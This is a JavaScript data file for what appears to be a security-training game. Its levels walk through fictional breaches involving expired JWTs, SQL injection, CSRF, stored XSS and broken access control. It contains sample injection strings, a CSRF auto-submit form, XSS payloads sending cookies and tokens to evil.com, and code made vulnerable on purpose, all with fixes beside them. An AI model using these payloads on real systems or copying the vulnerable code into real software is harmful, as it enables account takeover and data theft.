// Network topology definitions for each level

export const LEVEL_1_NETWORK = [
  {
    id: "gateway",
    name: "API Gateway",
    hostname: "api-gateway-01.techcorp.local",
    type: "gateway",
    description: "Main entry point for all requests",
    status: "unexamined",
    scanResult:
      "Gateway appears normal. Routes traffic to auth service and web server.",
    logs: "Recent requests from various IPs. Some unusual patterns detected after hours.",
    npc: {
      name: "💻 DevOps Engineer",
      dialog:
        "The gateway's been seeing weird traffic patterns lately. Requests coming in at odd hours, but they all authenticate successfully, so I figured it was just someone working late...",
    },
  },
  {
    id: "auth",
    name: "Auth Service",
    hostname: "auth-service-01.techcorp.local",
    type: "auth",
    description: "JWT token issuer",
    status: "unexamined",
    scanResult: "Auth service running. Issues JWT tokens for authenticated users.",
    logs: `[2024-11-11 08:23:41] INFO  Token validation service started
[2024-11-11 08:23:41] INFO  Loading configuration from jwt.config.js
[2024-11-11 08:23:42] INFO  Signature verification: ENABLED (HS256)
[2024-11-11 08:23:42] INFO  Issuer validation: ENABLED
[2024-11-11 08:23:42] WARN  Expiration validation: DISABLED
[2024-11-11 08:23:42] INFO  Service ready on port 8080
[2024-11-11 09:15:23] INFO  Token validated: user=contractor_mike_2024, role=admin
                            token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJjb250cmFjdG9yX21pa2VfMjAyNCIsIm5hbWUiOiJNaWtlIEpvaG5zb24iLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3MDQwNjcyMDAsImV4cCI6MTcwOTI1MTIwMH0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
[2024-11-11 09:15:45] INFO  Token validated: user=sarah_jones, role=user
[2024-11-11 14:32:11] INFO  Token validated: user=contractor_mike_2024, role=admin
                            token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJjb250cmFjdG9yX21pa2VfMjAyNCIsIm5hbWUiOiJNaWtlIEpvaG5zb24iLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3MDQwNjcyMDAsImV4cCI6MTcwOTI1MTIwMH0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
[2024-11-11 23:47:03] INFO  Token validated: user=contractor_mike_2024, role=admin

Statistics (last 24h):
  Total validations: 2,847
  Successful: 2,835 (99.6%)
  Failed (invalid signature): 12 (0.4%)`,
    clue: "auth_config",
    sampleToken:
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJjb250cmFjdG9yX21pa2VfMjAyNCIsIm5hbWUiOiJNaWtlIEpvaG5zb24iLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3MDQwNjcyMDAsImV4cCI6MTcwOTI1MTIwMH0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
    tokenData: {
      requiresClues: ["suspicious_user", "auth_config"],
      details: `Analyzing recent JWT tokens...

Found active token:
Header: {"alg":"HS256","typ":"JWT"}
Payload: {
  "sub": "contractor_mike_2024",
  "name": "Mike Johnson",
  "role": "admin",
  "iat": 1704067200,  // Issued: Jan 1, 2024
  "exp": 1709251200   // Expires: Mar 1, 2024
}
Signature: Valid

Current date: November 11, 2024

⚠️ This token expired 8 months ago!
⚠️ But it's still being accepted because expiration checking is disabled.`,
      solution:
        'JWT tokens MUST be validated for expiration. The "exp" claim should be checked against current time. Accepting expired tokens allows former employees unauthorized access.',
    },
    vulnerability: "jwt_expiration",
    npc: {
      name: "👨‍💼 Backend Developer",
      dialog:
        "We had some clock skew issues between servers a few months back. I temporarily disabled JWT expiration checking to debug it. Did I forget to re-enable it? Let me check the config... oh no.",
    },
  },
  {
    id: "web",
    name: "Web Server",
    hostname: "web-server-01.techcorp.local",
    type: "webserver",
    description: "Main application server",
    status: "unexamined",
    scanResult: "Web server handling requests. Accepts tokens from auth service.",
    logs: "Serving requests normally. All incoming requests have valid JWT signatures.",
    npc: {
      name: "👩‍💻 Frontend Developer",
      dialog:
        "I haven't noticed anything wrong with the web server itself. All requests seem properly authenticated. Maybe check the auth service?",
    },
  },
  {
    id: "database",
    name: "Database",
    hostname: "db-primary-01.techcorp.local",
    type: "database",
    description: "User data storage",
    status: "unexamined",
    scanResult: "Database running normally. Recent queries show data access patterns.",
    logs: `2024-11-09 23:42:15 UTC [contractor_mike_2024] SELECT * FROM users WHERE role='admin' LIMIT 1000;
2024-11-09 23:42:18 UTC [contractor_mike_2024] Duration: 145.234ms, Rows: 1000
2024-11-09 23:43:01 UTC [sarah_jones] SELECT * FROM users WHERE id = 42;
2024-11-09 23:43:02 UTC [sarah_jones] Duration: 2.145ms, Rows: 1
2024-11-08 02:15:33 UTC [contractor_mike_2024] SELECT * FROM customer_data WHERE created > '2024-01-01';
2024-11-08 02:15:41 UTC [contractor_mike_2024] Duration: 7823.442ms, Rows: 54231
2024-11-08 02:16:12 UTC [contractor_mike_2024] COPY (SELECT * FROM financial_transactions) TO '/tmp/export.csv';
2024-11-08 02:18:45 UTC [contractor_mike_2024] Duration: 153221.887ms, Rows: 428941
2024-11-07 03:22:18 UTC [contractor_mike_2024] COPY (SELECT cc_number, expiry, cvv FROM payments) TO '/tmp/cards.csv';
2024-11-07 03:24:03 UTC [contractor_mike_2024] Duration: 98442.123ms, Rows: 89234

Performance metrics:
  Largest queries (by duration) last 7 days:
    1. contractor_mike_2024: 153s (428k rows)
    2. contractor_mike_2024: 98s (89k rows)
    3. data_warehouse_job: 45s (2.1M rows)`,
    clue: "suspicious_user",
    npc: {
      name: "🗄️ DBA",
      dialog:
        "I've been seeing large data exports from an account called 'contractor_mike_2024'. The user has admin privileges so I assumed it was legitimate. But now that you mention it, the timing is weird - always after midnight. Is that normal?",
    },
  },
  {
    id: "admin",
    name: "Admin Workstation",
    hostname: "admin-ws-contractor-01.techcorp.local",
    type: "workstation",
    description: "Management workstation",
    status: "unexamined",
    scanResult:
      "Workstation offline. Last used 7 months ago by contractor Mike Johnson.",
    logs: `System logs:
Last login: Apr 15, 2024 at 14:32 by mike.johnson
Status: DECOMMISSIONED
Reason: Contractor end date reached

Active Directory sync:
- User account: contractor_mike_2024
- Contract end date: March 1, 2024
- Access revocation: FAILED - tokens still valid
- Status: ⚠️ SHOULD HAVE BEEN DISABLED`,
    clue: "expired_contractor",
    npc: {
      name: "👤 HR Manager",
      dialog:
        "Mike Johnson worked here as a contractor from January through March 2024. Really talented backend developer, worked on our auth system. His contract ended March 1st and we didn't renew. Why are you asking about him?",
    },
  },
  {
    id: "logging",
    name: "Logging Service",
    hostname: "logs-aggregator-01.techcorp.local",
    type: "logging",
    description: "Centralized logging",
    status: "unexamined",
    scanResult: "Logging service collecting events from all systems.",
    logs: 'Aggregated logs show pattern of late-night access using token "eyJhbG...". Same token used repeatedly.',
    npc: {
      name: "📊 Security Analyst",
      dialog:
        "I've been reviewing the logs and something feels off. We have consistent access from the same token, but the user isn't in our current employee roster. I was about to escalate when you got assigned to this investigation.",
    },
  },
];

export const LEVEL_2_NETWORK = [
  {
    id: "gateway",
    name: "API Gateway",
    hostname: "api-gateway-02.techcorp.local",
    type: "gateway",
    description: "Main API entry point",
    status: "unexamined",
    scanResult: "Gateway routing traffic to backend services.",
    logs: `API Request logs:
GET /api/users?id=1 - 200 OK
GET /api/users?id=2 - 200 OK
GET /api/users?id=1' OR '1'='1 - 200 OK (returned ALL users!)
⚠️ Suspicious query pattern detected`,
    clue: "injectable_endpoint",
    npc: {
      name: "💻 API Developer",
      dialog:
        "The /api/users endpoint takes an ID parameter. We built it quickly for the demo. It works fine... I think?",
    },
  },
  {
    id: "api-server",
    name: "API Server",
    hostname: "api-backend-01.techcorp.local",
    type: "api",
    description: "Backend API server",
    status: "unexamined",
    scanResult: "Node.js API server running on port 3000.",
    logs: `Application logs:
[INFO] Server started on port 3000
[WARN] Using string concatenation for SQL queries
[ERROR] Unexpected SQL error: syntax error near "OR"
[INFO] Request: /api/users?id=1' OR '1'='1`,
    sourceCode: `// api/users.js
app.get('/api/users', (req, res) => {
  const userId = req.query.id;

  // ❌ VULNERABLE: String concatenation
  const query = "SELECT * FROM users WHERE id = '" + userId + "'";

  db.query(query, (err, results) => {
    if (err) return res.status(500).json({error: err.message});
    res.json(results);
  });
});

// ❌ ALSO VULNERABLE: Hardcoded credentials
const DB_PASSWORD = "SuperSecret123!";
const db = mysql.createConnection({
  host: 'db-primary-01',
  user: 'admin',
  password: DB_PASSWORD,
  database: 'users_db'
});`,
    vulnerability: "sql_injection",
    clue: "source_code_secrets",
    npc: {
      name: "👨‍💼 Backend Engineer",
      dialog:
        "Yeah, I wrote that users API endpoint. It's pretty straightforward - just takes the ID from the query string and looks up the user. Wait, you're not suggesting someone could manipulate the query string, are you?",
    },
  },
  {
    id: "database",
    name: "Database",
    hostname: "db-primary-01.techcorp.local",
    type: "database",
    description: "MySQL database",
    status: "unexamined",
    scanResult: "MySQL 8.0 running on port 3306.",
    logs: `MySQL Query Log:
[11:23:45] SELECT * FROM users WHERE id = '1'
[11:23:52] SELECT * FROM users WHERE id = '2'
[11:24:01] SELECT * FROM users WHERE id = '1' OR '1'='1'
            ^^^ Returned 1,247 rows instead of 1!
[11:24:15] SELECT * FROM users WHERE id = '1' UNION SELECT password FROM admin_users--'
            ^^^ CRITICAL: Password dump attempt!

⚠️ SQL injection attempts detected`,
    clue: "suspicious_queries",
    npc: {
      name: "🗄️ Database Admin",
      dialog:
        "I've been seeing some really weird queries in the logs. Stuff with ' OR '1'='1' in it. That shouldn't be possible if the API is properly sanitizing inputs... right?",
    },
  },
  {
    id: "repo",
    name: "Git Repository",
    hostname: "git.techcorp.local",
    type: "git",
    description: "Source code repository",
    status: "unexamined",
    scanResult: "GitLab CE, 1,247 commits, 42 branches.",
    logs: `Recent commits:
abc123 - "Quick fix for user API" (contains hardcoded password)
def456 - "Add admin password to config" (committed secrets)
⚠️ Secrets detected in commit history`,
    sourceAccess: true,
    npc: {
      name: "👩‍💻 DevOps Lead",
      dialog:
        "We use GitLab for source control. All the API code is in there. You have read access if you need to review anything. Just... don't judge our code quality too harshly.",
    },
  },
  {
    id: "monitoring",
    name: "Monitoring Service",
    hostname: "monitor-01.techcorp.local",
    type: "monitoring",
    description: "Application monitoring",
    status: "unexamined",
    scanResult: "Prometheus + Grafana monitoring stack.",
    logs: `Alert History:
[WARN] High error rate on /api/users endpoint (45% errors)
[WARN] Abnormal response sizes (avg 2KB -> 450KB)
[CRITICAL] Possible data breach - large dataset returned`,
    npc: {
      name: "📊 SRE",
      dialog:
        "Our monitoring has been going crazy. The /api/users endpoint is returning huge responses and throwing tons of errors. Something's definitely wrong.",
    },
  },
];

export const LEVEL_3_NETWORK = [
  {
    id: "gateway",
    name: "API Gateway",
    hostname: "api-gateway-03.techcorp.local",
    type: "gateway",
    description: "External API gateway",
    status: "unexamined",
    scanResult: "Gateway proxying requests to external payment API.",
    logs: `SSL/TLS Connection logs:
[INFO] Connecting to payment-api.external.com:443
[WARN] Certificate validation: DISABLED
[INFO] Connection established (insecure)
⚠️ MITM attacks possible - certificate validation disabled`,
    clue: "disabled_cert_check",
    npc: {
      name: "💻 Integration Engineer",
      dialog:
        "We integrate with an external payment API. They use HTTPS so it should be secure. Although... we did have to disable certificate validation to get it working. Their cert was giving errors.",
    },
  },
  {
    id: "payment-proxy",
    name: "Payment Proxy",
    hostname: "payment-proxy-01.techcorp.local",
    type: "proxy",
    description: "Proxy for external payment API",
    status: "unexamined",
    scanResult: "Node.js proxy service for payment processing.",
    logs: `Application logs:
[INFO] Initializing HTTPS client
[WARN] process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0'
[INFO] Certificate errors will be ignored
[ERROR] Certificate validation bypassed for payment-api.external.com`,
    sourceCode: `// payment-proxy.js
const https = require('https');

// ❌ DANGEROUS: Disables certificate validation globally
process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';

const agent = new https.Agent({
  rejectUnauthorized: false  // ❌ NEVER DO THIS
});

function callPaymentAPI(data) {
  return https.request({
    hostname: 'payment-api.external.com',
    port: 443,
    method: 'POST',
    agent: agent  // Uses insecure agent
  });
}`,
    vulnerability: "cert_validation",
    npc: {
      name: "👨‍💼 Payment Team Lead",
      dialog:
        "The external payment API started throwing certificate errors. Something about 'self-signed' or 'untrusted CA'. We had a deadline, so we just... disabled the certificate check. It's HTTPS, so it's still encrypted, right?",
    },
  },
  {
    id: "external-api",
    name: "External Payment API",
    hostname: "payment-api.external.com",
    type: "external",
    description: "Third-party payment processor",
    status: "unexamined",
    scanResult: "External API, not under our control.",
    certificate: {
      subject: "payment-api.external.com",
      issuer: "payment-api.external.com", // Self-signed!
      notBefore: "2024-01-01T00:00:00Z",
      notAfter: "2025-01-01T00:00:00Z",
      selfSigned: true,
    },
    logs: `Certificate Information:
Subject: CN=payment-api.external.com
Issuer: CN=payment-api.external.com  ⚠️ SELF-SIGNED
Valid from: 2024-01-01
Valid to: 2025-01-01
⚠️ Self-signed certificates should not be trusted in production`,
    clue: "invalid_certificate",
    npc: {
      name: "📞 External Support",
      dialog:
        "Oh yeah, we use a self-signed certificate for our API. We're a startup and proper certificates are expensive. Just disable certificate validation on your end. Lots of our clients do that. It's fine!",
    },
  },
  {
    id: "network-monitor",
    name: "Network Monitor",
    hostname: "netmon-01.techcorp.local",
    type: "monitoring",
    description: "Network traffic analysis",
    status: "unexamined",
    scanResult: "Wireshark + Suricata IDS.",
    logs: `Network Traffic Analysis:
[ALERT] Possible MITM attack detected
[INFO] Traffic to payment-api.external.com showing anomalies
[WARN] Certificate presented doesn't match expected fingerprint
[CRITICAL] Payment data may be compromised

Packet capture shows:
- Client hello to payment-api.external.com
- Server presents different certificate than expected
- Client accepts without validation
- Sensitive payment data transmitted`,
    clue: "suspicious_traffic",
    npc: {
      name: "🔍 Security Analyst",
      dialog:
        "Our IDS has been flagging something weird with the payment API traffic. The certificate fingerprint keeps changing. That shouldn't happen unless... oh no. Someone could be intercepting the connection.",
    },
  },
  {
    id: "docs",
    name: "Documentation",
    hostname: "docs.techcorp.local",
    type: "documentation",
    description: "Internal security docs",
    status: "unexamined",
    scanResult: "Confluence wiki with security guidelines.",
    logs: `Security Documentation:

⚠️ NEVER disable certificate validation in production!

Why Certificate Validation Matters:
1. Prevents man-in-the-middle attacks
2. Verifies server identity
3. Ensures encrypted connection is with correct party

Common Mistakes:
❌ Setting NODE_TLS_REJECT_UNAUTHORIZED=0
❌ Using rejectUnauthorized: false
❌ Accepting self-signed certs without pinning

If external API uses self-signed cert:
✅ Pin the specific certificate
✅ Use internal CA to issue proper certs
✅ Request they get proper CA-signed cert`,
    npc: {
      name: "📚 Security Team",
      dialog:
        "Our security guidelines explicitly say never to disable certificate validation. Whoever did that either didn't read the docs or was under pressure to ship quickly. This is a textbook man-in-the-middle vulnerability.",
    },
  },
];

export const LEVEL_4_NETWORK = [
  {
    id: "web-app",
    name: "Web Application",
    hostname: "webapp-01.techcorp.local",
    type: "webapp",
    description: "User-facing web application",
    status: "unexamined",
    scanResult: "Web app serving user dashboard and account management.",
    logs: `HTTP Request logs:
[INFO] POST /api/account/update - 200 OK (user: john_doe)
[INFO] POST /api/account/delete - 200 OK (user: sarah_jones)
[WARN] POST /api/account/delete - 200 OK (Referer: evil-site.com)
[ERROR] Unexpected account deletion from external origin
⚠️ No CSRF token validation detected`,
    clue: "missing_csrf_validation",
    npc: {
      name: "👩‍💻 Frontend Developer",
      dialog: "We have forms for updating user profiles and deleting accounts. They work great! We just POST to the API with the user's session cookie. Simple and effective, right?",
    },
  },
  {
    id: "api-backend",
    name: "API Backend",
    hostname: "api-backend-01.techcorp.local",
    type: "api",
    description: "Backend API for state changes",
    status: "unexamined",
    scanResult: "Express.js API handling account operations.",
    logs: `Application logs:
[INFO] DELETE /api/account/delete processing...
[INFO] Session validated: user=victim_user
[WARN] No CSRF token present in request
[INFO] Account deletion completed
[ERROR] User reports unauthorized account deletion`,
    sourceCode: `// api/account.js
app.post('/api/account/delete', requireAuth, (req, res) => {
  const userId = req.session.userId;

  // ❌ VULNERABLE: No CSRF protection
  // Any site can make this request if user has active session

  db.deleteAccount(userId, (err) => {
    if (err) return res.status(500).json({error: err.message});
    req.session.destroy();
    res.json({success: true, message: 'Account deleted'});
  });
});

// ✅ Should check CSRF token like this:
// if (req.body.csrfToken !== req.session.csrfToken) {
//   return res.status(403).json({error: 'Invalid CSRF token'});
// }`,
    vulnerability: "csrf_protection",
    clue: "forged_request",
    npc: {
      name: "👨‍💼 Backend Developer",
      dialog: "We check the session cookie on all state-changing requests. If you're logged in, you can update or delete your account. What more do we need? Wait... can other sites make requests on behalf of users?",
    },
  },
  {
    id: "user-browser",
    name: "User Browser",
    hostname: "user-workstation-01",
    type: "client",
    description: "Victim user's browser",
    status: "unexamined",
    scanResult: "Chrome browser with active session to webapp-01.",
    logs: `Browser Activity:
[10:23:45] User visits webapp-01.techcorp.local
[10:23:46] Session established (cookie: sessionId=abc123)
[10:24:12] User clicks link in email
[10:24:13] Navigates to malicious-site.com
[10:24:14] Malicious site loads hidden form:
            <form action="https://webapp-01.techcorp.local/api/account/delete" method="POST">
              <input type="hidden" name="confirm" value="yes">
            </form>
[10:24:14] Form auto-submits using JavaScript
[10:24:15] Browser includes session cookie automatically
[10:24:16] Account deleted without user knowledge
⚠️ CSRF attack successful`,
    clue: "suspicious_state_change",
    npc: {
      name: "😰 Victim User",
      dialog: "I clicked a link in an email that said 'You won a prize!' and suddenly I was logged out of my account. When I tried to log back in, my account was gone! I never clicked any delete button!",
    },
  },
  {
    id: "security-logs",
    name: "Security Monitoring",
    hostname: "security-01.techcorp.local",
    type: "monitoring",
    description: "Security event monitoring",
    status: "unexamined",
    scanResult: "SIEM collecting security events.",
    logs: `Security Events:
[ALERT] Multiple account deletions from external Referer headers
[WARN] Requests missing Origin/CSRF validation
[INFO] Pattern detected:
  - User has active session
  - Request comes from external site
  - No CSRF token validation
  - State change succeeds

Attack Pattern Analysis:
1. Attacker hosts malicious site
2. Tricks user into visiting
3. Site submits form to our API
4. Browser includes session cookie
5. Request succeeds without CSRF check
6. User's account modified/deleted

Recommendation: Implement CSRF token validation`,
    npc: {
      name: "🔒 Security Engineer",
      dialog: "I've been tracking these incidents. All the unauthorized state changes have one thing in common - the Referer header shows they originated from external sites. We need CSRF protection ASAP.",
    },
  },
];

export const LEVEL_5_NETWORK = [
  {
    id: "comment-system",
    name: "Comment System",
    hostname: "comments-01.techcorp.local",
    type: "webapp",
    description: "User comments and reviews",
    status: "unexamined",
    scanResult: "Web application with user-generated content.",
    logs: `Application logs:
[INFO] Comment submitted: "Great product!"
[INFO] Comment submitted: "<script>alert('XSS')</script>"
[WARN] JavaScript detected in user input
[ERROR] Script executed in other users' browsers
⚠️ Stored XSS vulnerability detected`,
    clue: "unsanitized_input",
    npc: {
      name: "👨‍💻 Full-Stack Developer",
      dialog: "Users can leave comments on products. We save them to the database and display them on the product page. We use innerHTML to render the comments with formatting. Is that a problem?",
    },
  },
  {
    id: "web-server",
    name: "Web Server",
    hostname: "web-01.techcorp.local",
    type: "webserver",
    description: "Serves comment pages",
    status: "unexamined",
    scanResult: "Nginx serving Node.js application.",
    logs: `HTTP Response headers:
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
[MISSING] Content-Security-Policy
[MISSING] X-XSS-Protection

⚠️ No Content Security Policy configured
⚠️ XSS attacks not prevented by headers`,
    clue: "missing_csp",
    sourceCode: "// comments.js\n" +
      "app.get('/product/:id', (req, res) => {\n" +
      "  db.getComments(req.params.id, (err, comments) => {\n" +
      "    const html = `\n" +
      "      <div class=\"comments\">\n" +
      "        ${comments.map(c => `\n" +
      "          <div class=\"comment\">\n" +
      "            <strong>${c.username}</strong>\n" +
      "            <!-- ❌ VULNERABLE: innerHTML with user data -->\n" +
      "            <div class=\"content\">${c.text}</div>\n" +
      "          </div>\n" +
      "        `).join('')}\n" +
      "      </div>\n" +
      "    `;\n" +
      "    res.send(html);\n" +
      "  });\n" +
      "});\n" +
      "\n" +
      "// Client-side rendering (ALSO VULNERABLE):\n" +
      "// commentDiv.innerHTML = userComment; // ❌ XSS!\n" +
      "//\n" +
      "// ✅ Use textContent instead:\n" +
      "// commentDiv.textContent = userComment;\n" +
      "//\n" +
      "// ✅ Or sanitize HTML:\n" +
      "// commentDiv.innerHTML = DOMPurify.sanitize(userComment);",
    vulnerability: "stored_xss",
    npc: {
      name: "🖥️ DevOps Engineer",
      dialog: "I can add security headers to Nginx if you tell me what we need. Content Security Policy? I've heard of it but never configured it. What does it do?",
    },
  },
  {
    id: "database",
    name: "Comments Database",
    hostname: "db-01.techcorp.local",
    type: "database",
    description: "Stores user comments",
    status: "unexamined",
    scanResult: "MongoDB storing comments collection.",
    logs: `Database entries:
{ user: "alice", text: "Love this product!" }
{ user: "bob", text: "Fast shipping" }
{ user: "attacker", text: "<img src=x onerror='fetch(\\\\"https://evil.com?cookie=\\\\"+document.cookie)'>" }
{ user: "attacker", text: "<script>window.location='https://evil.com?session='+localStorage.token</script>" }

⚠️ Malicious JavaScript stored in database
⚠️ Will execute when rendered on page`,
    clue: "script_injection",
    npc: {
      name: "🗄️ Database Admin",
      dialog: "I've been seeing some weird comments in the database. They have <script> tags and stuff. I thought that wasn't allowed? Should we be filtering this before it gets stored?",
    },
  },
  {
    id: "victim-browser",
    name: "Victim Browser",
    hostname: "user-pc-42",
    type: "client",
    description: "User viewing comments",
    status: "unexamined",
    scanResult: "Firefox browser loading product page.",
    logs: `Browser Console:
[10:45:22] Loading https://comments-01.techcorp.local/product/123
[10:45:23] Rendering 15 comments...
[10:45:23] ⚠️ Executing: fetch("https://evil.com?cookie=" + document.cookie)
[10:45:24] ⚠️ Session cookie sent to attacker's server
[10:45:24] ⚠️ Executing: window.location='https://evil.com?session=' + localStorage.token
[10:45:25] ⚠️ User redirected to malicious site with their token

Impact:
- Session hijacking
- Cookie theft
- Unauthorized actions as victim
- Phishing redirects
- Keylogging
- Account takeover`,
    npc: {
      name: "😨 Victim User",
      dialog: "I was just reading product reviews and suddenly got redirected to a weird site. Then I got an email saying someone accessed my account from Russia. Did I get hacked just by reading comments?!",
    },
  },
  {
    id: "attacker-server",
    name: "Attacker Server",
    hostname: "evil.com",
    type: "external",
    description: "Receives stolen data",
    status: "unexamined",
    scanResult: "External server collecting stolen sessions.",
    logs: `Attacker's logs:
[SUCCESS] Received cookie: sessionId=xyz789; userId=42
[SUCCESS] Received token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
[INFO] Using stolen session to access victim account
[INFO] Changed password, email, 2FA settings
[INFO] Account takeover complete

Attack Summary:
1. Inject malicious script in comment
2. Script stored in database
3. Every user viewing product executes script
4. Script steals cookies/tokens
5. Sends stolen credentials to attacker
6. Attacker uses credentials for account takeover

Defense: Sanitize all user input + CSP headers`,
    npc: {
      name: "👤 Threat Intelligence",
      dialog: "We've identified a server collecting stolen session data from our users. The attack vector is XSS in the comment system. This is a stored XSS attack - one malicious comment can compromise thousands of users.",
    },
  },
];

export const LEVEL_6_NETWORK = [
  {
    id: "admin-panel",
    name: "Admin Panel",
    hostname: "admin.techcorp.local",
    type: "webapp",
    description: "Administrative interface",
    status: "unexamined",
    scanResult: "Web interface for system administration.",
    logs: `Access logs:
[INFO] GET /admin - 200 OK (user: admin_alice)
[INFO] GET /admin - 200 OK (user: regular_bob)  ⚠️ Should be forbidden!
[WARN] Regular user accessed admin panel
[ERROR] Authorization bypass detected`,
    clue: "missing_auth_check",
    sourceCode: `// admin.js
// ❌ VULNERABLE: Only checks if user is logged in
app.get('/admin', requireLogin, (req, res) => {
  // Missing role check!
  // Should verify: if (req.user.role !== 'admin') return 403

  res.render('admin-panel', {
    users: getAllUsers(),
    settings: getSystemSettings()
  });
});

// ❌ ALSO VULNERABLE: Direct object reference
app.post('/admin/user/:id/promote', requireLogin, (req, res) => {
  // No check if current user is admin
  // No check if target user ID is valid
  // Allows any logged-in user to promote themselves!

  db.updateUser(req.params.id, {role: 'admin'}, (err) => {
    res.json({success: true});
  });
});

// ✅ Correct implementation:
// app.get('/admin', requireLogin, requireRole('admin'), (req, res) => {...})`,
    vulnerability: "auth_bypass",
    npc: {
      name: "👨‍💼 Admin Team Lead",
      dialog: "The admin panel is protected by login. You need a valid session to access it. We figured that's enough security. Are you saying we need to check the user's role too?",
    },
  },
  {
    id: "api-server",
    name: "API Server",
    hostname: "api-01.techcorp.local",
    type: "api",
    description: "Backend API endpoints",
    status: "unexamined",
    scanResult: "REST API with authentication bypass.",
    logs: `API request logs:
[INFO] POST /api/user/123/promote {"role": "admin"} - 200 OK
       User: regular_bob (user_id: 456)
       Target: regular_bob (user_id: 456)
       ⚠️ User promoted themselves to admin!

[INFO] GET /api/users/123/private - 200 OK
       User: regular_bob (user_id: 456)
       Accessing: alice (user_id: 123)
       ⚠️ User accessed another user's private data!

Pattern: Insecure Direct Object References (IDOR)`,
    clue: "privilege_escalation",
    npc: {
      name: "👩‍💻 API Developer",
      dialog: "Our API uses user IDs in the URL. We check that the user is logged in, but we don't verify they have permission to access that specific resource. I guess we assumed users would only request their own data?",
    },
  },
  {
    id: "session-store",
    name: "Session Store",
    hostname: "redis-01.techcorp.local",
    type: "cache",
    description: "Session management",
    status: "unexamined",
    scanResult: "Redis storing session tokens.",
    logs: `Session analysis:
Session ID format: user_[timestamp]_[counter]
Examples:
  user_1699632000_001
  user_1699632001_002
  user_1699632002_003

⚠️ Predictable session IDs!
⚠️ Attacker can enumerate valid sessions:
   - Guess timestamp (current time)
   - Guess counter (sequential)
   - Try: user_[now]_001, user_[now]_002, etc.

Current sessions:
  user_1699632000_042 -> {userId: 123, role: 'admin'}
  user_1699632015_043 -> {userId: 456, role: 'user'}

Attacker can forge session IDs and impersonate users!`,
    clue: "insecure_session",
    vulnerability: "broken_access_control",
    npc: {
      name: "🔧 Infrastructure Engineer",
      dialog: "We generate session IDs using timestamps and counters. Makes debugging easier since we can see when a session was created. Why are you looking at me like that? Should they be random?",
    },
  },
  {
    id: "audit-log",
    name: "Audit System",
    hostname: "audit-01.techcorp.local",
    type: "logging",
    description: "Security audit logging",
    status: "unexamined",
    scanResult: "Audit trail of security events.",
    logs: `Security Audit Log:
[2024-11-10 14:23:11] User 'regular_bob' accessed /admin panel
[2024-11-10 14:23:45] User 'regular_bob' promoted user_id 456 to admin
                      ⚠️ User promoted themselves!
[2024-11-10 14:24:12] User 'regular_bob' accessed user 123's private data
                      ⚠️ IDOR attack - accessed other user's data
[2024-11-10 14:25:33] Session 'user_1699632016_044' created without user login
                      ⚠️ Session forgery detected!
[2024-11-10 14:26:01] 'regular_bob' (now admin) created new admin account
[2024-11-10 14:26:45] 'regular_bob' disabled audit logging
                      ⚠️ Attacker covering tracks

Attack Chain:
1. Bypass admin panel authorization
2. Use IDOR to access admin user data
3. Forge predictable session token
4. Escalate privileges to admin
5. Create backdoor admin account
6. Disable logging to hide activity`,
    npc: {
      name: "🔍 Security Auditor",
      dialog: "The audit logs show a textbook privilege escalation attack. A regular user gained admin access through multiple vulnerabilities: missing authorization checks, IDOR, and predictable session tokens. We need defense in depth!",
    },
  },
];

export const LEVEL_7_NETWORK = [
  {
    id: "api-gateway",
    name: "API Gateway",
    hostname: "api-gw.techcorp.local",
    type: "gateway",
    description: "REST API gateway",
    status: "unexamined",
    scanResult: "Kong API Gateway routing to microservices.",
    logs: `Gateway logs:
[INFO] Rate limiting: DISABLED
[WARN] 10,000 requests from 192.168.1.100 in 60 seconds
[WARN] 5,000 requests to /api/users/1 through /api/users/5000
[ERROR] User enumeration attack in progress
⚠️ No rate limiting allows brute force attacks`,
    clue: "no_rate_limits",
    npc: {
      name: "🔧 Platform Engineer",
      dialog: "We removed rate limiting during load testing and forgot to re-enable it. The API should be fast, right? Why would we want to slow down requests?",
    },
  },
  {
    id: "user-api",
    name: "User API",
    hostname: "user-api-01.techcorp.local",
    type: "api",
    description: "User management API",
    status: "unexamined",
    scanResult: "RESTful API for user operations.",
    logs: `API Response analysis:
GET /api/users/123 returns:
{
  "id": 123,
  "username": "alice",
  "email": "alice@company.com",
  "firstName": "Alice",
  "lastName": "Johnson",
  "phone": "+1-555-0123",
  "ssn": "123-45-6789",  ⚠️ Should not be exposed!
  "salary": 95000,       ⚠️ Should not be exposed!
  "address": "123 Main St",
  "creditCard": "4532-****-****-1234",
  "internalNotes": "Performance issues, consider PIP"  ⚠️ Internal data!
}

⚠️ API returns excessive data!
⚠️ Sensitive fields exposed to all authenticated users`,
    clue: "sensitive_data_leak",
    vulnerability: "excessive_data_exposure",
    sourceCode: `// user-api.js
app.get('/api/users/:id', requireAuth, (req, res) => {
  // ❌ VULNERABLE: Returns entire user object
  db.users.findById(req.params.id, (err, user) => {
    // No filtering of sensitive fields!
    res.json(user);
  });
});

// ❌ ALSO VULNERABLE: No ownership check (IDOR)
// User 456 can access user 123's data

// ✅ Should do:
// 1. Check if req.user.id === req.params.id (or has admin role)
// 2. Filter response to only include safe fields:
//    return {id, username, firstName, lastName} (public fields only)
// 3. Implement field-level permissions`,
    npc: {
      name: "👨‍💻 Backend Developer",
      dialog: "We just return the user object from the database. It has all the fields the frontend might need. Should we be filtering that? Which fields are sensitive?",
    },
  },
  {
    id: "authorization",
    name: "Authorization Service",
    hostname: "authz-01.techcorp.local",
    type: "auth",
    description: "Authorization and access control",
    status: "unexamined",
    scanResult: "Centralized authorization service (Casbin).",
    logs: `Authorization logs:
[INFO] Checking: Can user 456 read user 123?
[WARN] No policy defined - defaulting to ALLOW
       ⚠️ Default-allow is dangerous!

[INFO] Checking: Can user 456 access salary data?
[WARN] No field-level permissions configured
       ⚠️ All authenticated users can see all fields!

Object-Level Authorization:
